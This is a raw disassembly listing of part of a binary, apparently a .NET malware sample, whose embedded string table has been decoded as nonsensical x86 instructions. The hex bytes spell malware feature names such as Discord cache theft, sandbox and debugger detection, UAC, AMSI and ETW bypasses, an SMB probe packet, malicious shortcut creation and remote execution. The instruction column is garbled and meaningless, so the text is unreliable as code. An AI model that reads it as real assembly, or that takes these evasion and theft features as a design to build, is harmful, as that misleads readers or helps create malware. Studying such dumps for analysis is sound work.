  408b6c:	70 74                	jo     0x408be2
  408b6e:	69 6f 6e 73 00 4d 61 	imul   $0x614d0073,0x6e(%edi),%ebp
  408b75:	6e                   	outsb  %ds:(%esi),(%dx)
  408b76:	61                   	popa
  408b77:	67 65 6d             	gs insl (%dx),%es:(%di)
  408b7a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b7c:	74 4f                	je     0x408bcd
  408b7e:	70 74                	jo     0x408bf4
  408b80:	69 6f 6e 73 00 67 65 	imul   $0x65670073,0x6e(%edi),%ebp
  408b87:	74 5f                	je     0x408be8
  408b89:	43                   	inc    %ebx
  408b8a:	68 61 72 73 00       	push   $0x737261
  408b8f:	44                   	inc    %esp
  408b90:	69 73 63 6f 72 64 43 	imul   $0x4364726f,0x63(%ebx),%esi
  408b97:	61                   	popa
  408b98:	63 68 65             	arpl   %ebp,0x65(%eax)
  408b9b:	46                   	inc    %esi
  408b9c:	6f                   	outsl  %ds:(%esi),(%dx)
  408b9d:	6c                   	insb   (%dx),%es:(%edi)
  408b9e:	64 65 72 73          	fs gs jb 0x408c15
  408ba2:	00 70 6f             	add    %dh,0x6f(%eax)
  408ba5:	73 73                	jae    0x408c1a
  408ba7:	69 62 6c 65 46 6f 6c 	imul   $0x6c6f4665,0x6c(%edx),%esp
  408bae:	64 65 72 73          	fs gs jb 0x408c25
  408bb2:	00 74 61 72          	add    %dh,0x72(%ecx,%eiz,2)
  408bb6:	67 65 74 46          	addr16 gs je 0x408c00
  408bba:	6f                   	outsl  %ds:(%esi),(%dx)
  408bbb:	6c                   	insb   (%dx),%es:(%edi)
  408bbc:	64 65 72 73          	fs gs jb 0x408c33
  408bc0:	00 52 75             	add    %dl,0x75(%edx)
  408bc3:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc4:	74 69                	je     0x408c2f
  408bc6:	6d                   	insl   (%dx),%es:(%edi)
  408bc7:	65 48                	gs dec %eax
  408bc9:	65 6c                	gs insb (%dx),%es:(%edi)
  408bcb:	70 65                	jo     0x408c32
  408bcd:	72 73                	jb     0x408c42
  408bcf:	00 56 69             	add    %dl,0x69(%esi)
  408bd2:	72 74                	jb     0x408c48
  408bd4:	75 61                	jne    0x408c37
  408bd6:	6c                   	insb   (%dx),%es:(%edi)
  408bd7:	4d                   	dec    %ebp
  408bd8:	61                   	popa
  408bd9:	63 68 69             	arpl   %ebp,0x69(%eax)
  408bdc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdd:	65 73 4d             	gs jae 0x408c2d
  408be0:	61                   	popa
  408be1:	6e                   	outsb  %ds:(%esi),(%dx)
  408be2:	75 66                	jne    0x408c4a
  408be4:	61                   	popa
  408be5:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408be9:	65 72 73             	gs jb  0x408c5f
  408bec:	00 47 65             	add    %al,0x65(%edi)
  408bef:	74 4d                	je     0x408c3e
  408bf1:	65 74 68             	gs je  0x408c5c
  408bf4:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf5:	64 50                	fs push %eax
  408bf7:	61                   	popa
  408bf8:	72 61                	jb     0x408c5b
  408bfa:	6d                   	insl   (%dx),%es:(%edi)
  408bfb:	65 74 65             	gs je  0x408c63
  408bfe:	72 73                	jb     0x408c73
  408c00:	00 53 61             	add    %dl,0x61(%ebx)
  408c03:	6e                   	outsb  %ds:(%esi),(%dx)
  408c04:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  408c08:	49                   	dec    %ecx
  408c09:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0a:	64 69 63 61 74 6f 72 	imul   $0x73726f74,%fs:0x61(%ebx),%esp
  408c11:	73 
  408c12:	00 67 65             	add    %ah,0x65(%edi)
  408c15:	74 5f                	je     0x408c76
  408c17:	54                   	push   %esp
  408c18:	6f                   	outsl  %ds:(%esi),(%dx)
  408c19:	74 61                	je     0x408c7c
  408c1b:	6c                   	insb   (%dx),%es:(%edi)
  408c1c:	48                   	dec    %eax
  408c1d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c1e:	75 72                	jne    0x408c92
  408c20:	73 00                	jae    0x408c22
  408c22:	61                   	popa
  408c23:	64 6d                	fs insl (%dx),%es:(%edi)
  408c25:	69 6e 50 61 73 73 00 	imul   $0x737361,0x50(%esi),%ebp
  408c2c:	4d                   	dec    %ebp
  408c2d:	61                   	popa
  408c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c2f:	61                   	popa
  408c30:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c33:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c35:	74 43                	je     0x408c7a
  408c37:	6c                   	insb   (%dx),%es:(%edi)
  408c38:	61                   	popa
  408c39:	73 73                	jae    0x408cae
  408c3b:	00 55 41             	add    %dl,0x41(%ebp)
  408c3e:	43                   	inc    %ebx
  408c3f:	42                   	inc    %edx
  408c40:	79 70                	jns    0x408cb2
  408c42:	61                   	popa
  408c43:	73 73                	jae    0x408cb8
  408c45:	00 44 50 49          	add    %al,0x49(%eax,%edx,2)
  408c49:	42                   	inc    %edx
  408c4a:	79 70                	jns    0x408cbc
  408c4c:	61                   	popa
  408c4d:	73 73                	jae    0x408cc2
  408c4f:	00 45 54             	add    %al,0x54(%ebp)
  408c52:	57                   	push   %edi
  408c53:	42                   	inc    %edx
  408c54:	79 70                	jns    0x408cc6
  408c56:	61                   	popa
  408c57:	73 73                	jae    0x408ccc
  408c59:	00 41 6d             	add    %al,0x6d(%ecx)
  408c5c:	73 69                	jae    0x408cc7
  408c5e:	42                   	inc    %edx
  408c5f:	79 70                	jns    0x408cd1
  408c61:	61                   	popa
  408c62:	73 73                	jae    0x408cd7
  408c64:	00 45 74             	add    %al,0x74(%ebp)
  408c67:	77 42                	ja     0x408cab
  408c69:	79 70                	jns    0x408cdb
  408c6b:	61                   	popa
  408c6c:	73 73                	jae    0x408ce1
  408c6e:	00 70 72             	add    %dh,0x72(%eax)
  408c71:	6f                   	outsl  %ds:(%esi),(%dx)
  408c72:	63 65 73             	arpl   %esp,0x73(%ebp)
  408c75:	73 41                	jae    0x408cb8
  408c77:	63 63 65             	arpl   %esp,0x65(%ebx)
  408c7a:	73 73                	jae    0x408cef
  408c7c:	00 68 50             	add    %ch,0x50(%eax)
  408c7f:	72 6f                	jb     0x408cf0
  408c81:	63 65 73             	arpl   %esp,0x73(%ebp)
  408c84:	73 00                	jae    0x408c86
  408c86:	43                   	inc    %ebx
  408c87:	72 69                	jb     0x408cf2
  408c89:	74 69                	je     0x408cf4
  408c8b:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408c8e:	50                   	push   %eax
  408c8f:	72 6f                	jb     0x408d00
  408c91:	63 65 73             	arpl   %esp,0x73(%ebp)
  408c94:	73 00                	jae    0x408c96
  408c96:	4f                   	dec    %edi
  408c97:	70 65                	jo     0x408cfe
  408c99:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9a:	50                   	push   %eax
  408c9b:	72 6f                	jb     0x408d0c
  408c9d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408ca0:	73 00                	jae    0x408ca2
  408ca2:	47                   	inc    %edi
  408ca3:	65 74 43             	gs je  0x408ce9
  408ca6:	75 72                	jne    0x408d1a
  408ca8:	72 65                	jb     0x408d0f
  408caa:	6e                   	outsb  %ds:(%esi),(%dx)
  408cab:	74 50                	je     0x408cfd
  408cad:	72 6f                	jb     0x408d1e
  408caf:	63 65 73             	arpl   %esp,0x73(%ebp)
  408cb2:	73 00                	jae    0x408cb4
  408cb4:	49                   	dec    %ecx
  408cb5:	50                   	push   %eax
  408cb6:	41                   	inc    %ecx
  408cb7:	64 64 72 65          	fs fs jb 0x408d20
  408cbb:	73 73                	jae    0x408d30
  408cbd:	00 48 61             	add    %cl,0x61(%eax)
  408cc0:	73 53                	jae    0x408d15
  408cc2:	75 73                	jne    0x408d37
  408cc4:	70 69                	jo     0x408d2f
  408cc6:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  408cc9:	75 73                	jne    0x408d3e
  408ccb:	4d                   	dec    %ebp
  408ccc:	61                   	popa
  408ccd:	63 41 64             	arpl   %eax,0x64(%ecx)
  408cd0:	64 72 65             	fs jb  0x408d38
  408cd3:	73 73                	jae    0x408d48
  408cd5:	00 47 65             	add    %al,0x65(%edi)
  408cd8:	74 50                	je     0x408d2a
  408cda:	72 6f                	jb     0x408d4b
  408cdc:	63 41 64             	arpl   %eax,0x64(%ecx)
  408cdf:	64 72 65             	fs jb  0x408d47
  408ce2:	73 73                	jae    0x408d57
  408ce4:	00 6c 70 42          	add    %ch,0x42(%eax,%esi,2)
  408ce8:	61                   	popa
  408ce9:	73 65                	jae    0x408d50
  408ceb:	41                   	inc    %ecx
  408cec:	64 64 72 65          	fs fs jb 0x408d55
  408cf0:	73 73                	jae    0x408d65
  408cf2:	00 47 65             	add    %al,0x65(%edi)
  408cf5:	74 50                	je     0x408d47
  408cf7:	68 79 73 69 63       	push   $0x63697379
  408cfc:	61                   	popa
  408cfd:	6c                   	insb   (%dx),%es:(%edi)
  408cfe:	41                   	inc    %ecx
  408cff:	64 64 72 65          	fs fs jb 0x408d68
  408d03:	73 73                	jae    0x408d78
  408d05:	00 6c 70 41          	add    %ch,0x41(%eax,%esi,2)
  408d09:	64 64 72 65          	fs fs jb 0x408d72
  408d0d:	73 73                	jae    0x408d82
  408d0f:	00 6c 70 53          	add    %ch,0x53(%eax,%esi,2)
  408d13:	74 61                	je     0x408d76
  408d15:	72 74                	jb     0x408d8b
  408d17:	41                   	inc    %ecx
  408d18:	64 64 72 65          	fs fs jb 0x408d81
  408d1c:	73 73                	jae    0x408d91
  408d1e:	00 63 74             	add    %ah,0x74(%ebx)
  408d21:	73 00                	jae    0x408d23
  408d23:	53                   	push   %ebx
  408d24:	79 73                	jns    0x408d99
  408d26:	74 65                	je     0x408d8d
  408d28:	6d                   	insl   (%dx),%es:(%edi)
  408d29:	2e 4e                	cs dec %esi
  408d2b:	65 74 2e             	gs je  0x408d5c
  408d2e:	53                   	push   %ebx
  408d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d30:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408d33:	74 73                	je     0x408da8
  408d35:	00 73 65             	add    %dh,0x65(%ebx)
  408d38:	74 5f                	je     0x408d99
  408d3a:	41                   	inc    %ecx
  408d3b:	72 67                	jb     0x408da4
  408d3d:	75 6d                	jne    0x408dac
  408d3f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d41:	74 73                	je     0x408db6
  408d43:	00 45 78             	add    %al,0x78(%ebp)
  408d46:	69 73 74 73 00 49 50 	imul   $0x50490073,0x74(%ebx),%esi
  408d4d:	53                   	push   %ebx
  408d4e:	74 61                	je     0x408db1
  408d50:	74 75                	je     0x408dc7
  408d52:	73 00                	jae    0x408d54
  408d54:	67 65 74 5f          	addr16 gs je 0x408db7
  408d58:	53                   	push   %ebx
  408d59:	74 61                	je     0x408dbc
  408d5b:	74 75                	je     0x408dd2
  408d5d:	73 00                	jae    0x408d5f
  408d5f:	43                   	inc    %ebx
  408d60:	6f                   	outsl  %ds:(%esi),(%dx)
  408d61:	6e                   	outsb  %ds:(%esi),(%dx)
  408d62:	63 61 74             	arpl   %esp,0x74(%ecx)
  408d65:	00 46 6f             	add    %al,0x6f(%esi)
  408d68:	72 6d                	jb     0x408dd7
  408d6a:	61                   	popa
  408d6b:	74 00                	je     0x408d6d
  408d6d:	4d                   	dec    %ebp
  408d6e:	61                   	popa
  408d6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d70:	61                   	popa
  408d71:	67 65 6d             	gs insl (%dx),%es:(%di)
  408d74:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d76:	74 42                	je     0x408dba
  408d78:	61                   	popa
  408d79:	73 65                	jae    0x408de0
  408d7b:	4f                   	dec    %edi
  408d7c:	62 6a 65             	bound  %ebp,0x65(%edx)
  408d7f:	63 74 00 68          	arpl   %esi,0x68(%eax,%eax,1)
  408d83:	4f                   	dec    %edi
  408d84:	62 6a 65             	bound  %ebp,0x65(%edx)
  408d87:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408d8b:	61                   	popa
  408d8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d8d:	61                   	popa
  408d8e:	67 65 6d             	gs insl (%dx),%es:(%di)
  408d91:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d93:	74 4f                	je     0x408de4
  408d95:	62 6a 65             	bound  %ebp,0x65(%edx)
  408d98:	63 74 00 49          	arpl   %esi,0x49(%eax,%eax,1)
  408d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d9d:	6a 65                	push   $0x65
  408d9f:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  408da3:	65 6c                	gs insb (%dx),%es:(%edi)
  408da5:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  408daa:	6f                   	outsl  %ds:(%esi),(%dx)
  408dab:	6e                   	outsb  %ds:(%esi),(%dx)
  408dac:	6e                   	outsb  %ds:(%esi),(%dx)
  408dad:	65 63 74 00 6c       	arpl   %esi,%gs:0x6c(%eax,%eax,1)
  408db2:	70 66                	jo     0x408e1a
  408db4:	6c                   	insb   (%dx),%es:(%edi)
  408db5:	4f                   	dec    %edi
  408db6:	6c                   	insb   (%dx),%es:(%edi)
  408db7:	64 50                	fs push %eax
  408db9:	72 6f                	jb     0x408e2a
  408dbb:	74 65                	je     0x408e22
  408dbd:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  408dc1:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  408dc8:	72 6f                	jb     0x408e39
  408dca:	74 65                	je     0x408e31
  408dcc:	63 74 00 66          	arpl   %esi,0x66(%eax,%eax,1)
  408dd0:	6c                   	insb   (%dx),%es:(%edi)
  408dd1:	50                   	push   %eax
  408dd2:	72 6f                	jb     0x408e43
  408dd4:	74 65                	je     0x408e3b
  408dd6:	63 74 00 66          	arpl   %esi,0x66(%eax,%eax,1)
  408dda:	6c                   	insb   (%dx),%es:(%edi)
  408ddb:	4e                   	dec    %esi
  408ddc:	65 77 50             	gs ja  0x408e2f
  408ddf:	72 6f                	jb     0x408e50
  408de1:	74 65                	je     0x408e48
  408de3:	63 74 00 47          	arpl   %esi,0x47(%eax,%eax,1)
  408de7:	65 74 00             	gs je  0x408dea
  408dea:	53                   	push   %ebx
  408deb:	79 73                	jns    0x408e60
  408ded:	74 65                	je     0x408e54
  408def:	6d                   	insl   (%dx),%es:(%edi)
  408df0:	2e 4e                	cs dec %esi
  408df2:	65 74 00             	gs je  0x408df5
  408df5:	48                   	dec    %eax
  408df6:	61                   	popa
  408df7:	73 44                	jae    0x408e3d
  408df9:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408dfd:	52                   	push   %edx
  408dfe:	65 67 69 73 74 72 79 	imul   $0x65537972,%gs:0x74(%bp,%di),%esi
  408e05:	53 65 
  408e07:	74 00                	je     0x408e09
  408e09:	73 6d                	jae    0x408e78
  408e0b:	62 5f 70             	bound  %ebx,0x70(%edi)
  408e0e:	72 6f                	jb     0x408e7f
  408e10:	62 65 5f             	bound  %esp,0x5f(%ebp)
  408e13:	70 61                	jo     0x408e76
  408e15:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408e18:	74 00                	je     0x408e1a
  408e1a:	53                   	push   %ebx
  408e1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1c:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408e1f:	74 00                	je     0x408e21
  408e21:	47                   	inc    %edi
  408e22:	65 74 4c             	gs je  0x408e71
  408e25:	6f                   	outsl  %ds:(%esi),(%dx)
  408e26:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408e29:	53                   	push   %ebx
  408e2a:	75 62                	jne    0x408e8e
  408e2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e2d:	65 74 00             	gs je  0x408e30
  408e30:	57                   	push   %edi
  408e31:	61                   	popa
  408e32:	69 74 00 6f 70 5f 45 	imul   $0x78455f70,0x6f(%eax,%eax,1),%esi
  408e39:	78 
  408e3a:	70 6c                	jo     0x408ea8
  408e3c:	69 63 69 74 00 53 70 	imul   $0x70530074,0x69(%ebx),%esp
  408e43:	6c                   	insb   (%dx),%es:(%edi)
  408e44:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%eax,%eax,1),%esi
  408e4b:	46 
  408e4c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e4d:	72 45                	jb     0x408e94
  408e4f:	78 69                	js     0x408eba
  408e51:	74 00                	je     0x408e53
  408e53:	47                   	inc    %edi
  408e54:	65 74 52             	gs je  0x408ea9
  408e57:	65 73 75             	gs jae 0x408ecf
  408e5a:	6c                   	insb   (%dx),%es:(%edi)
  408e5b:	74 00                	je     0x408e5d
  408e5d:	53                   	push   %ebx
  408e5e:	65 74 52             	gs je  0x408eb3
  408e61:	65 73 75             	gs jae 0x408ed9
  408e64:	6c                   	insb   (%dx),%es:(%edi)
  408e65:	74 00                	je     0x408e67
  408e67:	46                   	inc    %esi
  408e68:	69 6c 65 45 78 69 73 	imul   $0x74736978,0x45(%ebp,%eiz,2),%ebp
  408e6f:	74 
  408e70:	73 41                	jae    0x408eb3
  408e72:	6e                   	outsb  %ds:(%esi),(%dx)
  408e73:	64 52                	fs push %edx
  408e75:	65 63 65 6e          	arpl   %esp,%gs:0x6e(%ebp)
  408e79:	74 00                	je     0x408e7b
  408e7b:	41                   	inc    %ecx
  408e7c:	63 63 65             	arpl   %esp,0x65(%ebx)
  408e7f:	70 74                	jo     0x408ef5
  408e81:	54                   	push   %esp
  408e82:	63 70 43             	arpl   %esi,0x43(%eax)
  408e85:	6c                   	insb   (%dx),%es:(%edi)
  408e86:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  408e8d:	73 74                	jae    0x408f03
  408e8f:	65 6d                	gs insl (%dx),%es:(%edi)
  408e91:	2e 4d                	cs dec %ebp
  408e93:	61                   	popa
  408e94:	6e                   	outsb  %ds:(%esi),(%dx)
  408e95:	61                   	popa
  408e96:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e99:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e9b:	74 00                	je     0x408e9d
  408e9d:	45                   	inc    %ebp
  408e9e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e9f:	76 69                	jbe    0x408f0a
  408ea1:	72 6f                	jb     0x408f12
  408ea3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ea4:	6d                   	insl   (%dx),%es:(%edi)
  408ea5:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ea7:	74 00                	je     0x408ea9
  408ea9:	67 65 74 5f          	addr16 gs je 0x408f0c
  408ead:	43                   	inc    %ebx
  408eae:	75 72                	jne    0x408f22
  408eb0:	72 65                	jb     0x408f17
  408eb2:	6e                   	outsb  %ds:(%esi),(%dx)
  408eb3:	74 00                	je     0x408eb5
  408eb5:	47                   	inc    %edi
  408eb6:	65 74 43             	gs je  0x408efc
  408eb9:	75 72                	jne    0x408f2d
  408ebb:	72 65                	jb     0x408f22
  408ebd:	6e                   	outsb  %ds:(%esi),(%dx)
  408ebe:	74 00                	je     0x408ec0
  408ec0:	67 65 74 5f          	addr16 gs je 0x408f23
  408ec4:	50                   	push   %eax
  408ec5:	72 6f                	jb     0x408f36
  408ec7:	63 65 73             	arpl   %esp,0x73(%ebp)
  408eca:	73 6f                	jae    0x408f3b
  408ecc:	72 43                	jb     0x408f11
  408ece:	6f                   	outsl  %ds:(%esi),(%dx)
  408ecf:	75 6e                	jne    0x408f3f
  408ed1:	74 00                	je     0x408ed3
  408ed3:	54                   	push   %esp
  408ed4:	68 72 65 61 64       	push   $0x64616572
  408ed9:	53                   	push   %ebx
  408eda:	74 61                	je     0x408f3d
  408edc:	72 74                	jb     0x408f52
  408ede:	00 43 6f             	add    %al,0x6f(%ebx)
  408ee1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee2:	76 65                	jbe    0x408f49
  408ee4:	72 74                	jb     0x408f5a
  408ee6:	00 52 65             	add    %dl,0x65(%edx)
  408ee9:	6d                   	insl   (%dx),%es:(%edi)
  408eea:	6f                   	outsl  %ds:(%esi),(%dx)
  408eeb:	74 65                	je     0x408f52
  408eed:	45                   	inc    %ebp
  408eee:	78 65                	js     0x408f55
  408ef0:	63 50 6f             	arpl   %edx,0x6f(%eax)
  408ef3:	72 74                	jb     0x408f69
  408ef5:	00 70 6f             	add    %dh,0x6f(%eax)
  408ef8:	72 74                	jb     0x408f6e
  408efa:	00 67 65             	add    %ah,0x65(%edi)
  408efd:	74 5f                	je     0x408f5e
  408eff:	52                   	push   %edx
  408f00:	65 71 75             	gs jno 0x408f78
  408f03:	65 73 74             	gs jae 0x408f7a
  408f06:	00 48 74             	add    %cl,0x74(%eax)
  408f09:	74 70                	je     0x408f7b
  408f0b:	4c                   	dec    %esp
  408f0c:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408f13:	52                   	push   %edx
  408f14:	65 71 75             	gs jno 0x408f8c
  408f17:	65 73 74             	gs jae 0x408f8e
  408f1a:	00 67 65             	add    %ah,0x65(%edi)
  408f1d:	74 5f                	je     0x408f7e
  408f1f:	41                   	inc    %ecx
  408f20:	64 64 72 65          	fs fs jb 0x408f89
  408f24:	73 73                	jae    0x408f99
  408f26:	4c                   	dec    %esp
  408f27:	69 73 74 00 68 6f 73 	imul   $0x736f6800,0x74(%ebx),%esi
  408f2e:	74 00                	je     0x408f30
  408f30:	50                   	push   %eax
  408f31:	75 74                	jne    0x408fa7
  408f33:	00 43 72             	add    %al,0x72(%ebx)
  408f36:	65 61                	gs popa
  408f38:	74 65                	je     0x408f9f
  408f3a:	53                   	push   %ebx
  408f3b:	68 6f 72 74 63       	push   $0x6374726f
  408f40:	75 74                	jne    0x408fb6
  408f42:	00 43 72             	add    %al,0x72(%ebx)
  408f45:	65 61                	gs popa
  408f47:	74 65                	je     0x408fae
  408f49:	4d                   	dec    %ebp
  408f4a:	61                   	popa
  408f4b:	6c                   	insb   (%dx),%es:(%edi)
  408f4c:	69 63 69 6f 75 73 53 	imul   $0x5373756f,0x69(%ebx),%esp
  408f53:	68 6f 72 74 63       	push   $0x6374726f
  408f58:	75 74                	jne    0x408fce
  408f5a:	00 73 65             	add    %dh,0x65(%ebx)
  408f5d:	74 5f                	je     0x408fbe
  408f5f:	54                   	push   %esp
  408f60:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  408f67:	73 65                	jae    0x408fce
  408f69:	74 5f                	je     0x408fca
  408f6b:	53                   	push   %ebx
  408f6c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f6e:	64 54                	fs push %esp
  408f70:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  408f77:	73 65                	jae    0x408fde
  408f79:	74 5f                	je     0x408fda
  408f7b:	52                   	push   %edx
  408f7c:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408f80:	76 65                	jbe    0x408fe7
  408f82:	54                   	push   %esp
  408f83:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  408f8a:	74 69                	je     0x408ff5
  408f8c:	6d                   	insl   (%dx),%es:(%edi)
  408f8d:	65 6f                	outsl  %gs:(%esi),(%dx)
  408f8f:	75 74                	jne    0x409005
  408f91:	00 67 65             	add    %ah,0x65(%edi)
  408f94:	74 5f                	je     0x408ff5
  408f96:	53                   	push   %ebx
  408f97:	74 61                	je     0x408ffa
  408f99:	6e                   	outsb  %ds:(%esi),(%dx)
  408f9a:	64 61                	fs popa
  408f9c:	72 64                	jb     0x409002
  408f9e:	4f                   	dec    %edi
  408f9f:	75 74                	jne    0x409015
  408fa1:	70 75                	jo     0x409018
  408fa3:	74 00                	je     0x408fa5
  408fa5:	73 65                	jae    0x40900c
  408fa7:	74 5f                	je     0x409008
  408fa9:	52                   	push   %edx
  408faa:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  408fb1:	53 74 
  408fb3:	61                   	popa
  408fb4:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb5:	64 61                	fs popa
  408fb7:	72 64                	jb     0x40901d
  408fb9:	4f                   	dec    %edi
  408fba:	75 74                	jne    0x409030
  408fbc:	70 75                	jo     0x409033
  408fbe:	74 00                	je     0x408fc0
  408fc0:	4d                   	dec    %ebp
  408fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc2:	76 65                	jbe    0x409029
  408fc4:	4e                   	dec    %esi
  408fc5:	65 78 74             	gs js  0x40903c
  408fc8:	00 53 79             	add    %dl,0x79(%ebx)
  408fcb:	73 74                	jae    0x409041
  408fcd:	65 6d                	gs insl (%dx),%es:(%edi)
  408fcf:	2e 54                	cs push %esp
  408fd1:	65 78 74             	gs js  0x409048
  408fd4:	00 57 72             	add    %dl,0x72(%edi)
  408fd7:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  408fde:	65 
  408fdf:	78 74                	js     0x409055
  408fe1:	00 48 74             	add    %cl,0x74(%eax)
  408fe4:	74 70                	je     0x409056
  408fe6:	4c                   	dec    %esp
  408fe7:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408fee:	43                   	inc    %ebx
  408fef:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff1:	74 65                	je     0x409058
  408ff3:	78 74                	js     0x409069
  408ff5:	00 47 65             	add    %al,0x65(%edi)
  408ff8:	74 43                	je     0x40903d
  408ffa:	6f                   	outsl  %ds:(%esi),(%dx)
  408ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffc:	74 65                	je     0x409063
  408ffe:	78 74                	js     0x409074
  409000:	00 53 74             	add    %dl,0x74(%ebx)
  409003:	61                   	popa
  409004:	72 74                	jb     0x40907a
  409006:	4e                   	dec    %esi
  409007:	65 77 00             	gs ja  0x40900a
  40900a:	67 65 74 5f          	addr16 gs je 0x40906d
  40900e:	4e                   	dec    %esi
  40900f:	6f                   	outsl  %ds:(%esi),(%dx)
  409010:	77 00                	ja     0x409012
  409012:	67 65 74 5f          	addr16 gs je 0x409075
  409016:	55                   	push   %ebp
  409017:	74 63                	je     0x40907c
  409019:	4e                   	dec    %esi
  40901a:	6f                   	outsl  %ds:(%esi),(%dx)
  40901b:	77 00                	ja     0x40901d
  40901d:	73 65                	jae    0x409084
  40901f:	74 5f                	je     0x409080
  409021:	43                   	inc    %ebx
  409022:	72 65                	jb     0x409089
  409024:	61                   	popa
  409025:	74 65                	je     0x40908c
  409027:	4e                   	dec    %esi
  409028:	6f                   	outsl  %ds:(%esi),(%dx)
  409029:	57                   	push   %edi
  40902a:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  409031:	68 72 6f 77 00       	push   $0x776f72
  409036:	56                   	push   %esi
  409037:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
  40903e:	6c                   	insb   (%dx),%es:(%edi)
  40903f:	6c                   	insb   (%dx),%es:(%edi)
  409040:	6f                   	outsl  %ds:(%esi),(%dx)
  409041:	63 45 78             	arpl   %eax,0x78(%ebp)
  409044:	00 52 65             	add    %dl,0x65(%edx)
  409047:	67 65 78 00          	addr16 gs js 0x40904b
  40904b:	68 65 78 00 70       	push   $0x70007865
  409050:	72 65                	jb     0x4090b7
  409052:	66 69 78 00 48 61    	imul   $0x6148,0x0(%eax),%di
  409058:	73 44                	jae    0x40909e
  40905a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40905e:	54                   	push   %esp
  40905f:	69 6d 69 6e 67 44 65 	imul   $0x6544676e,0x69(%ebp),%ebp
  409066:	6c                   	insb   (%dx),%es:(%edi)
  409067:	61                   	popa
  409068:	79 00                	jns    0x40906a
  40906a:	48                   	dec    %eax
  40906b:	65 78 53             	gs js  0x4090c1
  40906e:	74 72                	je     0x4090e2
  409070:	69 6e 67 54 6f 42 79 	imul   $0x79426f54,0x67(%esi),%ebp
  409077:	74 65                	je     0x4090de
  409079:	41                   	inc    %ecx
  40907a:	72 72                	jb     0x4090ee
  40907c:	61                   	popa
  40907d:	79 00                	jns    0x40907f
  40907f:	49                   	dec    %ecx
  409080:	6e                   	outsb  %ds:(%esi),(%dx)
  409081:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409088:	65 
  409089:	41                   	inc    %ecx
  40908a:	72 72                	jb     0x4090fe
  40908c:	61                   	popa
  40908d:	79 00                	jns    0x40908f
  40908f:	67 65 74 5f          	addr16 gs je 0x4090f2
  409093:	49                   	dec    %ecx
  409094:	73 52                	jae    0x4090e8
  409096:	65 61                	gs popa
  409098:	64 79 00             	fs jns 0x40909b
  40909b:	43                   	inc    %ebx
  40909c:	72 65                	jb     0x409103
  40909e:	61                   	popa
  40909f:	74 65                	je     0x409106
  4090a1:	53                   	push   %ebx
  4090a2:	75 62                	jne    0x409106
  4090a4:	4b                   	dec    %ebx
  4090a5:	65 79 00             	gs jns 0x4090a8
  4090a8:	4f                   	dec    %edi
  4090a9:	70 65                	jo     0x409110
  4090ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ac:	53                   	push   %ebx
  4090ad:	75 62                	jne    0x409111
  4090af:	4b                   	dec    %ebx
  4090b0:	65 79 00             	gs jns 0x4090b3
  4090b3:	52                   	push   %edx
  4090b4:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
